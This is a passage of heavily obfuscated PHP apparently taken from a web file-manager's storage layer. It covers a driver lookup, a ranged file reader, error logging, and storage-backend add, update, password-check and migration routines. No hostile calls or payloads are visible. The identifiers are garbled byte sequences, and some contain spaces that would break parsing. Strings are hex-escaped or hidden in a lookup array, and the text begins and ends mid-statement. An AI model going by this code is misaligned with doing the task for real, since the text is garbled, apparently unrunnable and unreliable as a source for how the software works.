Hook::trigger($“´Î²Áİ[1295], $„ß·Ş—Ö, $Â¿¯¶©ª, $ıß¬÷‘ª); foreach ($…ÁéäÕƒ as $ˆÖ¾À™â) { IO::mkdir($ˆÖ¾À™â); } foreach ($µ‡Úö¹¤ as $ˆÖ¾À™â) { IO::copy($ˆÖ¾À™â[$“´Î²Áİ[1292]], $ˆÖ¾À™â[$“´Î²Áİ[1293]], REPEAT_REPLACE); } } public static function fileSubstr($à‡Û‡Ìü, $”÷àäğ÷, $ıÏ‰…®é = false) { $¤à¦Ïíğ =& $_SERVER[±Ö‰ô½¯]; $ûõ‰Ğ“Ã = self::driverMake($à‡Û‡Ìü); $æÌÅ”” = $ûõ‰Ğ“Ã->size($à‡Û‡Ìü); $­¾…ì…¸ = $”÷àäğ÷; $í×øşè¨ = $ıÏ‰…®é; if ($”÷àäğ÷ < 0) { $”÷àäğ÷ = $æÌÅ”” + $”÷àäğ÷; } if ($ıÏ‰…®é === !1) { $ıÏ‰…®é = $æÌÅ”” - $”÷àäğ÷; } if ($”÷àäğ÷ + $ıÏ‰…®é > $æÌÅ””) { $ıÏ‰…®é = $æÌÅ”” - $”÷àäğ÷; } if (!$æÌÅ”” && $ûõ‰Ğ“Ã->getType() == $¤à¦Ïíğ[107] && !$ûõ‰Ğ“Ã->exist($à‡Û‡Ìü)) { $Ø¶‡È° = get_path_this($à‡Û‡Ìü); $¼ñ×äéà = parse_url_query($Ø¶‡È°); if (is_array($¼ñ×äéà) && isset($¼ñ×äéà[$¤à¦Ïíğ[32]])) { $Ø¶‡È° = urldecode($¼ñ×äéà[$¤à¦Ïíğ[32]]); } throw new Exception($¤à¦Ïíğ[1296] . LNG($¤à¦Ïíğ[1297]) . $¤à¦Ïíğ[1082] . clear_html($Ø¶‡È°) . $¤à¦Ïíğ[12]); } if ($ıÏ‰…®é <= 0) { return $¤à¦Ïíğ[12]; } if ($”÷àäğ÷ < 0 || $”÷àäğ÷ >= $æÌÅ”” || $ıÏ‰…®é > $GLOBALS[$¤à¦Ïíğ[6]][$¤à¦Ïíğ[92]][$¤à¦Ïíğ[1298]]) { throw new Exception("\x66\x69\x6c\x65\122\145\x61\x64\x20\x65\x72\162\157\x72\x2c\x6f\166\145\162\40\x69\x6f\x52\x65\x61\144\115\x61\170\41\40\163\x74\141\x72\x74\x3d{$”÷àäğ÷}\x3b\154\x65\x6e\147\164\x68\75{$ıÏ‰…®é}\73\x20\x73\151\x7a\145\x3d{$æÌÅ””}\73"); } $š¿ß²±õ = $ûõ‰Ğ“Ã->fileSubstr($à‡Û‡Ìü, $”÷àäğ÷, $ıÏ‰…®é); if (!$š¿ß²±õ && $ıÏ‰…®é && isset($GLOBALS[$¤à¦Ïíğ[1299]])) { throw new Exception($GLOBALS[$¤à¦Ïíğ[1299]][$¤à¦Ïíğ[1300]]); } return $š¿ß²±õ; } private static function driverMake(&$ëºÏİáè) { $‰¹–äÎ× =& $_SERVER[±Ö‰ô½¯]; $¶¸ì÷ÈÒ = KodIO::parse($ëºÏİáè); if (!self::$driverListSystem) { $¾ã²•Ş = Model($‰¹–äÎ×[865])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¾ã²•Ş, $‰¹–äÎ×[484]); } if ($¶¸ì÷ÈÒ[$‰¹–äÎ×[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¶¸ì÷ÈÒ[$‰¹–äÎ×[484]]]) { throw new Exception($‰¹–äÎ×[1301]); return !1; } $ëºÏİáè = $¶¸ì÷ÈÒ[$‰¹–äÎ×[1302]]; $şÓ¿È ö = self::driverGet($¶¸ì÷ÈÒ, $ëºÏİáè); return $şÓ¿È ö; } private static function driverGet($£¾¹®¹, &$šÖÄ—”) { $…™ª¦ì¹ =& $_SERVER[±Ö‰ô½¯]; $å”·²—œ = $£¾¹®¹[$…™ª¦ì¹[1303]]; $€ƒÓªåİ = $£¾¹®¹[$…™ª¦ì¹[484]]; switch ($£¾¹®¹[$…™ª¦ì¹[33]]) { case KodIO::KOD_IO: $¸ÙğÚÒš = self::$driverListSystem[$€ƒÓªåİ]; break; case KodIO::KOD_SOURCE: $šÖÄ—” = $€ƒÓªåİ . $šÖÄ—”; $¸ÙğÚÒš = array($…™ª¦ì¹[1304] => $…™ª¦ì¹[1305], $…™ª¦ì¹[6] => $£¾¹®¹); $¸ÙğÚÒš[$…™ª¦ì¹[6]][$…™ª¦ì¹[1306]] = $£¾¹®¹[$…™ª¦ì¹[484]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¯–¾ß‰³ = $GLOBALS[$…™ª¦ì¹[1307]]; self::$driverListUser = array_to_keyvalue($¯–¾ß‰³, $…™ª¦ì¹[484]); } $¸ÙğÚÒš = self::$driverListUser[$€ƒÓªåİ]; break; case KodIO::KOD_SHARE_LINK: $¸ÙğÚÒš = array($…™ª¦ì¹[1304] => $…™ª¦ì¹[1308], $…™ª¦ì¹[6] => $£¾¹®¹); $†°‚³â¾ = Action($…™ª¦ì¹[1309])->sharePathInfo($£¾¹®¹[$…™ª¦ì¹[87]]); $šÖÄ—” = $†°‚³â¾[$…™ª¦ì¹[193]]; if (!$†°‚³â¾[$…™ª¦ì¹[193]]) { $•››Àç¸ = Model($…™ª¦ì¹[684])->getInfoByHash($£¾¹®¹[$…™ª¦ì¹[484]]); $šÖÄ—” = KodIO::clear($•››Àç¸[$…™ª¦ì¹[580]] . $£¾¹®¹[$…™ª¦ì¹[1302]]); $£¾¹®¹[$…™ª¦ì¹[573]] = $•››Àç¸; $£¾¹®¹[$…™ª¦ì¹[1283]] = $šÖÄ—”; $¸ÙğÚÒš = array($…™ª¦ì¹[1304] => $…™ª¦ì¹[1310], $…™ª¦ì¹[6] => $£¾¹®¹); } else { $¸ÙğÚÒš[$…™ª¦ì¹[6]][$…™ª¦ì¹[1306]] = $†°‚³â¾[$…™ª¦ì¹[193]]; } break; case KodIO::KOD_SHARE_ITEM: $¸ÙğÚÒš = array($…™ª¦ì¹[1304] => $…™ª¦ì¹[1311], $…™ª¦ì¹[6] => $£¾¹®¹); $•››Àç¸ = Model($…™ª¦ì¹[684])->getInfo($£¾¹®¹[$…™ª¦ì¹[484]]); if ($•››Àç¸[$…™ª¦ì¹[193]] == $…™ª¦ì¹[230]) { $šÖÄ—” = KodIO::clear($•››Àç¸[$…™ª¦ì¹[580]] . $£¾¹®¹[$…™ª¦ì¹[1302]]); $£¾¹®¹[$…™ª¦ì¹[573]] = $•››Àç¸; $£¾¹®¹[$…™ª¦ì¹[1283]] = $šÖÄ—”; $¸ÙğÚÒš = array($…™ª¦ì¹[1304] => $…™ª¦ì¹[1312], $…™ª¦ì¹[6] => $£¾¹®¹); } else { if (!$šÖÄ—”) { $šÖÄ—” = $•››Àç¸[$…™ª¦ì¹[193]]; } $¸ÙğÚÒš[$…™ª¦ì¹[6]][$…™ª¦ì¹[1306]] = $•››Àç¸[$…™ª¦ì¹[193]]; } break; case KodIO::KOD_SHARE_OUTER: $¸ÙğÚÒš = array($…™ª¦ì¹[1304] => $…™ª¦ì¹[1313], $…™ª¦ì¹[6] => $£¾¹®¹); break; default: $šÖÄ—” = $£¾¹®¹[$…™ª¦ì¹[87]]; $¸ÙğÚÒš = array($…™ª¦ì¹[1304] => $…™ª¦ì¹[1314]); break; } $”ÆÇµÎ¸ = $£¾¹®¹[$…™ª¦ì¹[87]]; if (!isset(self::$driverCache[$”ÆÇµÎ¸])) { $ó„‘½°À = strtolower($¸ÙğÚÒš[$…™ª¦ì¹[96]]); $­èä¾ Ì = $GLOBALS[$…™ª¦ì¹[6]][$…™ª¦ì¹[92]][$…™ª¦ì¹[931]]; $áĞäÖÓû = $…™ª¦ì¹[77] . (isset($­èä¾ Ì[$ó„‘½°À]) ? $­èä¾ Ì[$ó„‘½°À] : ucfirst($ó„‘½°À)); if (!class_exists($áĞäÖÓû)) { show_json("{$áĞäÖÓû}\x20\x6e\157\164\x20\x65\x78\x69\x73\x74\x73\x21", !1); } $ù€Š…è€ = isset($¸ÙğÚÒš[$…™ª¦ì¹[6]]) ? $¸ÙğÚÒš[$…™ª¦ì¹[6]] : !1; self::$driverCache[$”ÆÇµÎ¸] = new $áĞäÖÓû($ù€Š…è€); } $Ú¬»ºÕ = self::$driverCache[$”ÆÇµÎ¸]; $Ú¬»ºÕ->pathDriver = $å”·²—œ; $Ú¬»ºÕ->pathBase = $…™ª¦ì¹[12]; if (isset($¸ÙğÚÒš[$…™ª¦ì¹[6]][$…™ª¦ì¹[1315]])) { $Ú¬»ºÕ->pathBase = rtrim($¸ÙğÚÒš[$…™ª¦ì¹[6]][$…™ª¦ì¹[1315]], $…™ª¦ì¹[8]) . $…™ª¦ì¹[8]; $šÖÄ—” = $Ú¬»ºÕ->pathBase . ltrim($šÖÄ—”, $…™ª¦ì¹[8]); } $šÖÄ—” = $Ú¬»ºÕ->getPath($šÖÄ—”); if (isset($£¾¹®¹[$…™ª¦ì¹[1283]])) { $šÖÄ—” = $£¾¹®¹[$…™ª¦ì¹[1283]]; } $Ú¬»ºÕ->path = $šÖÄ—”; return $Ú¬»ºÕ; } public static function errorTips($ÙÇ…ºØ = false, $ùªæ‚¯Ì = true) { $¼§òÇˆÑ =& $_SERVER[±Ö‰ô½¯]; static $“ôÛóÅ = array(); $İ¿®Éšİ = 100; if ($ÙÇ…ºØ === -1) { return $“ôÛóÅ ? $“ôÛóÅ[count($“ôÛóÅ) - 1] : $¼§òÇˆÑ[12]; } if ($ÙÇ…ºØ === !1) { return implode($¼§òÇˆÑ[287], $“ôÛóÅ); } if (count($“ôÛóÅ) >= $İ¿®Éšİ) { $“ôÛóÅ = array_slice($“ôÛóÅ, $İ¿®Éšİ * 0.5, $İ¿®Éšİ); } $“ôÛóÅ[] = $ÙÇ…ºØ; if (!$ùªæ‚¯Ì) { return; } write_log($¼§òÇˆÑ[175] . ACTION . $¼§òÇˆÑ[1316] . $ÙÇ…ºØ, $¼§òÇˆÑ[1317]); } public static function getLastError($„€ş ä = '') { $§Œºˆà = self::errorTips(-1); return $§Œºˆà ? $§Œºˆà : $„€ş ä; } } goto EæÊÈÈšÜ; aÀ‹Ÿ©Œ‚: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\163\157\x75\x72\x63\x65\x53\145\143\x72\x65\x74\114\151\x73\164"; public $field = array("\x73\x6f\x75\162\143\x65\x49\x44", "\164\x79\x70\x65\111\x44", "\143\162\x65\141\164\x65\125\163\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\x73\164\157\x72\x61\x67\x65\114\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\163\151\172\x65\115\x61\x78", "\163\x79\x73\164\145\x6d", "\x64\145\x66\141\165\154\164", "\x64\x72\x69\166\145\162", "\x63\x6f\x6e\x66\x69\147"); public function listData($ı×à×†ñ = false, $Ÿ¯ñ»Ì = "\x6d\157\144\151\146\171\x54\x69\155\145", $¡Ú‘ŞõØ = false) { $şş°Äı€ =& $_SERVER[±Ö‰ô½¯]; $Ññ‰Ëæ£ = parent::listData($ı×à×†ñ, $Ÿ¯ñ»Ì, $¡Ú‘ŞõØ); if ($ı×à×†ñ) { return $Ññ‰Ëæ£; } $…’Üì = array(); if ($GLOBALS[$şş°Äı€[2471]]) { $…’Üì = $this->ioSizeUseGet(array_to_keyvalue($Ññ‰Ëæ£, $şş°Äı€[12], $şş°Äı€[484])); } foreach ($Ññ‰Ëæ£ as $´¥­ù¨† => $ì¨£ÉŠ) { unset($Ññ‰Ëæ£[$´¥­ù¨†][$şş°Äı€[6]]); $Ññ‰Ëæ£[$´¥­ù¨†][$şş°Äı€[2125]] = isset($…’Üì[$ì¨£ÉŠ[$şş°Äı€[484]]]) ? $…’Üì[$ì¨£ÉŠ[$şş°Äı€[484]]] : 0; } return $Ññ‰Ëæ£; } public function ioSizeUseGet($ÌÔÛÕ¢) { $Û§±öÈ€ =& $_SERVER[±Ö‰ô½¯]; if (!$ÌÔÛÕ¢) { return array(); } $ÂäõôÉà = $Û§±öÈ€[2472] . implode($Û§±öÈ€[50], $ÌÔÛÕ¢); $àı¾†™Ï = Cache::get($ÂäõôÉà); if ($àı¾†™Ï) { return $àı¾†™Ï; } $¬İèßôı = array($Û§±öÈ€[923] => $Û§±öÈ€[484], $Û§±öÈ€[2473] => $Û§±öÈ€[79]); $’‚Š÷ôı = array($Û§±öÈ€[923] => array($Û§±öÈ€[7], $ÌÔÛÕ¢)); $àı¾†™Ï = Model($Û§±öÈ€[891])->field($¬İèßôı)->where($’‚Š÷ôı)->group($Û§±öÈ€[923])->select(); $àı¾†™Ï = array_to_keyvalue($àı¾†™Ï, $Û§±öÈ€[484], $Û§±öÈ€[79]); Cache::set($ÂäõôÉà, $àı¾†™Ï, 600); return $àı¾†™Ï; } public function getConfig($€àä÷Í™) { $ë›Ú×¨Ê = parent::listData($€àä÷Í™); $ ¤òô—Å = _get($ë›Ú×¨Ê, $_SERVER[±Ö‰ô½¯][6], array()); if ($ ¤òô—Å && !is_array($ ¤òô—Å)) { $ ¤òô—Å = json_decode($ ¤òô—Å, !0); } return $ ¤òô—Å; } public function update($Ö£í”º, $œÀªÉÙØ) { $×»Ùä =& $_SERVER[±Ö‰ô½¯]; $Ñ–ôªÚƒ = $œÀªÉÙØ[$×»Ùä[32]]; $øçÆØØ = array_to_keyvalue(parent::listData(), $×»Ùä[32]); if (isset($øçÆØØ[$Ñ–ôªÚƒ]) && $øçÆØØ[$Ñ–ôªÚƒ][$×»Ùä[484]] != $Ö£í”º) { return !1; } $this->checkPwd($Ö£í”º, $œÀªÉÙØ); if (isset($œÀªÉÙØ[$×»Ùä[2474]]) && $œÀªÉÙØ[$×»Ùä[2474]] == $×»Ùä[91]) { $this->checkConfig($œÀªÉÙØ); } unset($œÀªÉÙØ[$×»Ùä[2474]]); $ĞÏß’ñù = parent::update($Ö£í”º, $œÀªÉÙØ); if ($ĞÏß’ñù && $œÀªÉÙØ[$×»Ùä[37]]) { foreach ($øçÆØØ as $Ş³˜¨¦Œ) { if ($Ş³˜¨¦Œ[$×»Ùä[37]] && $Ş³˜¨¦Œ[$×»Ùä[484]] != $Ö£í”º) { parent::update($Ş³˜¨¦Œ[$×»Ùä[484]], array($×»Ùä[37] => 0)); } } $this->updateBackup($Ö£í”º, $øçÆØØ); } return $ĞÏß’ñù; } public function add($ò¹óğê¬) { $İœº×€ =& $_SERVER[±Ö‰ô½¯]; $¼¦Æ›±´ = array_to_keyvalue(parent::listData(), $İœº×€[32]); if (isset($¼¦Æ›±´[$ò¹óğê¬[$İœº×€[32]]])) { return !1; } $this->checkConfig($ò¹óğê¬); $÷ªÂ¿û‡ = parent::insert($ò¹óğê¬); if ($÷ªÂ¿û‡ && $ò¹óğê¬[$İœº×€[37]]) { foreach ($¼¦Æ›±´ as $ªÙ™« ) { if ($ªÙ™« [$İœº×€[37]]) { parent::update($ªÙ™« [$İœº×€[484]], array($İœº×€[37] => 0)); } } $this->updateBackup($÷ªÂ¿û‡, $¼¦Æ›±´); } return $÷ªÂ¿û‡; } public function updateBackup($ù¹÷ØòÉ, $ŸÆø˜â) { $¿‚Üúãş =& $_SERVER[±Ö‰ô½¯]; if ($ù¹÷ØòÉ == $¿‚Üúãş[91]) { return; } $‹…íÅÇ° = Model($¿‚Üúãş[845])->config(); $àÔàÈ×Ì = $‹…íÅÇ°[$¿‚Üúãş[849]]; if ($‹…íÅÇ°[$¿‚Üúãş[1900]] != $¿‚Üúãş[91] || $àÔàÈ×Ì == $ù¹÷ØòÉ) { return; } if ($àÔàÈ×Ì != $¿‚Üúãş[91]) { $¶µƒÜ¶— = array(); foreach ($ŸÆø˜â as $®‡ã®è÷) { if ($ù¹÷ØòÉ == $®‡ã®è÷[$¿‚Üúãş[484]]) { continue; } $¶µƒÜ¶—[] = $®‡ã®è÷[$¿‚Üúãş[484]]; } if ($¶µƒÜ¶— && in_array($àÔàÈ×Ì, $¶µƒÜ¶—)) { return; } } $üÒ€ƒŠ— = Model($¿‚Üúãş[870])->get($¿‚Üúãş[877]); $üÒ€ƒŠ— = json_decode($üÒ€ƒŠ—, !0); if (!$üÒ€ƒŠ—) { return; } $üÒ€ƒŠ—[$¿‚Üúãş[849]] = $ù¹÷ØòÉ; Model($¿‚Üúãş[870])->set(array($¿‚Üúãş[877] => $üÒ€ƒŠ—)); } public function checkPwd($€’è¬·Æ, &$ØğœÈ¸) { $ôƒÍˆ£ô =& $_SERVER[±Ö‰ô½¯]; if (empty($ØğœÈ¸[$ôƒÍˆ£ô[6]])) { return; } $„«Ëˆüä = $ØğœÈ¸[$ôƒÍˆ£ô[6]]; if (!is_array($„«Ëˆüä)) { $„«Ëˆüä = json_decode($„«Ëˆüä, !0); } $¿÷‰ïÚò = $ôƒÍˆ£ô[12]; $ÒÆ¥ê© = array($ôƒÍˆ£ô[1590], $ôƒÍˆ£ô[2475], $ôƒÍˆ£ô[1002]); foreach ($ÒÆ¥ê© as $ØË£º¬‚) { if (isset($„«Ëˆüä[$ØË£º¬‚])) { $¿÷‰ïÚò = $ØË£º¬‚; break; } } if (!$¿÷‰ïÚò) { return; } $±Ÿ“ú›Â = $this->getConfig($€’è¬·Æ); $¬”õ–³² = $±Ÿ“ú›Â[$¿÷‰ïÚò]; $óò•Îˆ™ = $„«Ëˆüä[$¿÷‰ïÚò]; if ($óò•Îˆ™ == str_repeat($ôƒÍˆ£ô[222], strlen($¬”õ–³²))) { $„«Ëˆüä[$¿÷‰ïÚò] = $¬”õ–³²; $ØğœÈ¸[$ôƒÍˆ£ô[6]] = json_encode($„«Ëˆüä); } else { if ($óò•Îˆ™ != $¬”õ–³²) { $ØğœÈ¸[$ôƒÍˆ£ô[2474]] = $ôƒÍˆ£ô[91]; } } } public function checkConfig(&$é²áÛÆ», $å¼ô±÷õ = false) { $À÷´©ø =& $_SERVER[±Ö‰ô½¯]; $——şğ÷™ = strtolower($é²áÛÆ»[$À÷´©ø[96]]); $²óëÕ³¨ = $é²áÛÆ»[$À÷´©ø[6]]; if (!is_array($²óëÕ³¨)) { $²óëÕ³¨ = json_decode($²óëÕ³¨, !0); } foreach ($²óëÕ³¨ as $³‹¤Äğ => $ßş¢¡†¨) { if (is_string($ßş¢¡†¨)) { $²óëÕ³¨[$³‹¤Äğ] = trim($ßş¢¡†¨); } } $²óëÕ³¨[$À÷´©ø[2476]] = rand_string(6); $äÍò÷úÂ = $GLOBALS[$À÷´©ø[6]][$À÷´©ø[92]][$À÷´©ø[931]]; $İıÃŒ† = isset($äÍò÷úÂ[$——şğ÷™]) ? $äÍò÷úÂ[$——şğ÷™] : ucfirst($——şğ÷™); $¾ùìîØ = $À÷´©ø[77] . $İıÃŒ†; if (!$İıÃŒ† || !class_exists($¾ùìîØ)) { if ($å¼ô±÷õ) { return LNG($À÷´©ø[2477]); } write_log(array($À÷´©ø[2478], $é²áÛÆ», get_caller_info()), $À÷´©ø[215]); show_json(LNG($À÷´©ø[2477]), !1, $é²áÛÆ»); } $ŒÖÉ¿«Ø = new $¾ùìîØ($²óëÕ³¨); $Û±‰ŞóØ = rtrim($²óëÕ³¨[$À÷´©ø[1315]], $À÷´©ø[8]) . $À÷´©ø[8]; if (in_array($——şğ÷™, $ŒÖÉ¿«Ø->objectDriver)) { try { if (!$ŒÖÉ¿«Ø->isBucketCors() && !$ŒÖÉ¿«Ø->setBucketCors()) { $È÷˜–Ùí = LNG($À÷´©ø[2479]); $È÷˜–Ùí .= $À÷´©ø[2480] . LNG($À÷´©ø[2481]); } } catch (Exception $À¶º‚é„) { $È÷˜–Ùí = $À¶º‚é„->getMessage(); } if (isset($È÷˜–Ùí)) { return $this->_parseError($È÷˜–Ùí, $——şğ÷™, $å¼ô±÷õ); } if ($——şğ÷™ == $À÷´©ø[68] && !$ŒÖÉ¿«Ø->checkRegion()) { return $this->_parseError(LNG($À÷´©ø[2482]), $——şğ÷™, $å¼ô±÷õ); } } else { if ($——şğ÷™ == $À÷´©ø[2483]) { if ($ŒÖÉ¿«Ø->ftpPath) { $¯œ¶´¸¶ = trim($Û±‰ŞóØ, $À÷´©ø[8]); if (stripos($¯œ¶´¸¶, trim($ŒÖÉ¿«Ø->ftpPath, $À÷´©ø[8])) !== 0) { $Û±‰ŞóØ = $ŒÖÉ¿«Ø->ftpPath . $À÷´©ø[8] . ($¯œ¶´¸¶ ? $¯œ¶´¸¶ . $À÷´©ø[8] : $À÷´©ø[12]); } } } } $·ÃùÁÏá = $ŒÖÉ¿«Ø->getPath($Û±‰ŞóØ . $À÷´©ø[1319]); try { if ($——şğ÷™ == $À÷´©ø[107]) { $ŒÖÉ¿«Ø->mkdir($Û±‰ŞóØ); } $æ›¼Æ…¢ = $ŒÖÉ¿«Ø->mkfile($·ÃùÁÏá); if (!$æ›¼Æ…¢) { $È÷˜–Ùí = LNG($À÷´©ø[2479]); } } catch (Exception $À¶º‚é„) { $È÷˜–Ùí = $À¶º‚é„->getMessage(); } if (isset($È÷˜–Ùí)) { return $this->_parseError($È÷˜–Ùí, $——şğ÷™, $å¼ô±÷õ); } $²óëÕ³¨[$À÷´©ø[1315]] = $Û±‰ŞóØ; $é²áÛÆ»[$À÷´©ø[6]] = json_encode($²óëÕ³¨); $é²áÛÆ»[$À÷´©ø[96]] = $İıÃŒ†; return !0; } private function _parseError($²æÖâøå, $À“Â‡ª², $Éš‹ş¯ = false) { $†¢Ô«Ì =& $_SERVER[±Ö‰ô½¯]; if ($À“Â‡ª² == $†¢Ô«Ì[68] && stripos($²æÖâøå, $†¢Ô«Ì[2484])) { $¼ÒˆñÕœ = explode($†¢Ô«Ì[10], $²æÖâøå); $ßœ¨•ò£ = isset($¼ÒˆñÕœ[1]) ? $¼ÒˆñÕœ[1] : $†¢Ô«Ì[12]; $•Ã’¤«Î = array($†¢Ô«Ì[2485] => LNG($†¢Ô«Ì[2486]), $†¢Ô«Ì[2487] => LNG($†¢Ô«Ì[2488])); if (isset($•Ã’¤«Î[$ßœ¨•ò£])) { $²æÖâøå = $•Ã’¤«Î[$ßœ¨•ò£]; } } if (stripos($²æÖâøå, $†¢Ô«Ì[2489]) === 0) { $°‘Ò¾è = strpos($²æÖâøå, $†¢Ô«Ì[177]); if ($°‘Ò¾è === !1) { $°‘Ò¾è = strpos($²æÖâøå, $†¢Ô«Ì[4]); } if ($°‘Ò¾è !== !1) { $²æÖâøå = substr($²æÖâøå, $°‘Ò¾è + 1); } } $²æÖâøå = LNG($†¢Ô«Ì[1322]) . $²æÖâøå; if ($Éš‹ş¯) { return $²æÖâøå; } show_json($²æÖâøå, !1); } public function driverListSystem() { $˜¤Êñ—† =& $_SERVER[±Ö‰ô½¯]; $Õà˜ıµ§ = parent::listData(); $ú¿ûù¤ = array(); foreach ($Õà˜ıµ§ as $ÁŸÖûÁ) { unset($ÁŸÖûÁ[$˜¤Êñ—†[233]], $ÁŸÖûÁ[$˜¤Êñ—†[88]]); if (!is_array($ÁŸÖûÁ[$˜¤Êñ—†[6]])) { $ÁŸÖûÁ[$˜¤Êñ—†[6]] = json_decode($ÁŸÖûÁ[$˜¤Êñ—†[6]], !0); } $ú¿ûù¤[] = $ÁŸÖûÁ; } return $ú¿ûù¤; } public function defaultDriver() { $´âÀ‡İá =& $_SERVER[±Ö‰ô½¯]; $İñòÊê´ = parent::listData(); $ùó»´ØÓ = array_filter_by_field($İñòÊê´, $´âÀ‡İá[37], 1); $ùó»´ØÓ = $ùó»´ØÓ[0]; if (!$ùó»´ØÓ) { return array(); } if (!is_array($ùó»´ØÓ[$´âÀ‡İá[6]])) { $ùó»´ØÓ[$´âÀ‡İá[6]] = json_decode($ùó»´ØÓ[$´âÀ‡İá[6]], !0); } return $ùó»´ØÓ; } public function driverInfo($¬µÕ½Ö´) { $œ¿Ç£¥Ÿ =& $_SERVER[±Ö‰ô½¯]; $øê·®Ğ = array_to_keyvalue(parent::listData(), $œ¿Ç£¥Ÿ[484]); if (!isset($øê·®Ğ[$¬µÕ½Ö´])) { return !1; } $Ó´×ş™„ = $øê·®Ğ[$¬µÕ½Ö´]; if (!is_array($Ó´×ş™„[$œ¿Ç£¥Ÿ[6]])) { $Ó´×ş™„[$œ¿Ç£¥Ÿ[6]] = json_decode($Ó´×ş™„[$œ¿Ç£¥Ÿ[6]], !0); } return $Ó´×ş™„; } public function remove($¶Ğù³ÇÍ) { $this->removeShareItems($¶Ğù³ÇÍ); return parent::remove($¶Ğù³ÇÍ); } public function removeWithFile($Œ†³‰«ñ, $Ÿ…úğ¡, $‰¸àÜéÃ, $›ÌÕüê = false) { $È—Ç‹Ê„ =& $_SERVER[±Ö‰ô½¯]; ignore_timeout(); $–£‰úÍ— = array($È—Ç‹Ê„[923] => $Œ†³‰«ñ); $ğò¤‰Ü = Model($È—Ç‹Ê„[557]); if (isset($GLOBALS[$È—Ç‹Ê„[2490]])) { $Â—šãç = $GLOBALS[$È—Ç‹Ê„[2490]]; } else { $Â—šãç = $ğò¤‰Ü->where($–£‰úÍ—)->field(array($È—Ç‹Ê„[2387] => $È—Ç‹Ê„[2092], $È—Ç‹Ê„[2462] => $È—Ç‹Ê„[79]))->find(); } $æ¨ŠŒ¾¥ = intval($Â—šãç[$È—Ç‹Ê„[2092]]); $õóÙÉµÁ = intval($Â—šãç[$È—Ç‹Ê„[79]]); $ôş¡ªà¾ = $Ÿ…úğ¡ . $È—Ç‹Ê„[2491] . $Œ†³‰«ñ; $Í¢ íÓ­ = LNG($Ÿ…úğ¡ == $È—Ç‹Ê„[640] ? $È—Ç‹Ê„[2492] : $È—Ç‹Ê„[2493]); $È–üêÁ‰ = new TaskFileTransfer($ôş¡ªà¾, $È—Ç‹Ê„[215], $æ¨ŠŒ¾¥, $Í¢ íÓ­ . $È—Ç‹Ê„[474] . $‰¸àÜéÃ[$È—Ç‹Ê„[32]] . $È—Ç‹Ê„[214] . $Œ†³‰«ñ); $È–üêÁ‰->task[$È—Ç‹Ê„[861]] = (double) $õóÙÉµÁ; $ª®¬íÕ˜ = KodIO::defaultDriver(); $ÊÜœ‡©˜ = $ª®¬íÕ˜[$È—Ç‹Ê„[484]]; $§¦åøÑü = 1; $Õ¥àÃÙ = 5000; $ËÅ­ÖÏ = $…×™…Ø = $ëøÓóˆ = array(); $åƒşŠ’“ = $ğò¤‰Ü->where($–£‰úÍ—)->field($È—Ç‹Ê„[2494])->selectPage($Õ¥àÃÙ, $§¦åøÑü); $¾¢×Ï˜ = intval($åƒşŠ’“[$È—Ç‹Ê„[444]][$È—Ç‹Ê„[446]]); while ($åƒşŠ’“ && $§¦åøÑü <= $¾¢×Ï˜) { foreach ($åƒşŠ’“[$È—Ç‹Ê„[447]] as $™¥‰¦•û) { $—Úœ¢¸… = $™¥‰¦•û[$È—Ç‹Ê„[554]]; if ($›ÌÕüê) { $…×™…Ø[] = $—Úœ¢¸…; continue; } $×©ˆ‘Ë = $™¥‰¦•û[$È—Ç‹Ê„[87]]; $‚ª’²¥ = get_path_father($×©ˆ‘Ë); $ëøÓóˆ[] = $‚ª’²¥; $‚ª’²¥ = str_replace("\x7b\x69\x6f\72{$Œ†³‰«ñ}\175\57", "\173\x69\157\x3a{$ÊÜœ‡©˜}\x7d\x2f", $‚ª’²¥); if (!IO::exist($×©ˆ‘Ë)) { $ËÅ­ÖÏ[] = $—Úœ¢¸…; $È–üêÁ‰->updateFileEnd($™¥‰¦•û[$È—Ç‹Ê„[32]], $™¥‰¦•û[$È—Ç‹Ê„[79]]); write_log($È—Ç‹Ê„[2495] . $×©ˆ‘Ë, $È—Ç‹Ê„[2071]); continue; } $ä˜Ò±ö = IO::move($×©ˆ‘Ë, $‚ª’²¥, REPEAT_RENAME); if (!$ä˜Ò±ö) { $…×™…Ø[] = $—Úœ¢¸…; $È–üêÁ‰->updateFileEnd($™¥‰¦•û[$È—Ç‹Ê„[32]], $™¥‰¦•û[$È—Ç‹Ê„[79]]); write_log($È—Ç‹Ê„[2496] . $×©ˆ‘Ë, $È—Ç‹Ê„[2071]); continue; } $¡„²÷˜ê = array($È—Ç‹Ê„[923] => $ÊÜœ‡©˜, $È—Ç‹Ê„[87] => $ä˜Ò±ö); $ğò¤‰Ü->where(array($È—Ç‹Ê„[554] => $—Úœ¢¸…))->save($¡„²÷˜ê); } $§¦åøÑü++; $åƒşŠ’“ = $ğò¤‰Ü->where($–£‰úÍ—)->field($È—Ç‹Ê„[2494])->selectPage($Õ¥àÃÙ, $§¦åøÑü); } $ ŒŠÕË» = $È–üêÁ‰->task; if (!$›ÌÕüê) { Cache::set($ôş¡ªà¾, $ ŒŠÕË»); } $È–üêÁ‰->end(); $ËÅ­ÖÏ = array_unique($ËÅ­ÖÏ); $…×™…Ø = array_unique($…×™…Ø); if (!$›ÌÕüê && ($ËÅ­ÖÏ || $…×™…Ø)) { $ØÎ±ÙıÅ = array(); if ($ËÅ­ÖÏ) { $ØÎ±ÙıÅ[] = sprintf(LNG($È—Ç‹Ê„[2497]), count($ËÅ­ÖÏ)); } if ($…×™…Ø) { $ØÎ±ÙıÅ[] = sprintf(LNG($È—Ç‹Ê„[2498]), count($…×™…Ø)); } $ØÎ±ÙıÅ = sprintf(LNG($È—Ç‹Ê„[2499]), implode($È—Ç‹Ê„[1536], $ØÎ±ÙıÅ)) . $È—Ç‹Ê„[2500] . date($È—Ç‹Ê„[2501]) . $È—Ç‹Ê„[2502]; if ($Ÿ…úğ¡ == $È—Ç‹Ê„[1280]) { $ØÎ±ÙıÅ .= $È—Ç‹Ê„[2503] . LNG($È—Ç‹Ê„[2504]); } else { $ØÎ±ÙıÅ = LNG($È—Ç‹Ê„[2505]) . $È—Ç‹Ê„[2506] . $ØÎ±ÙıÅ; } $ 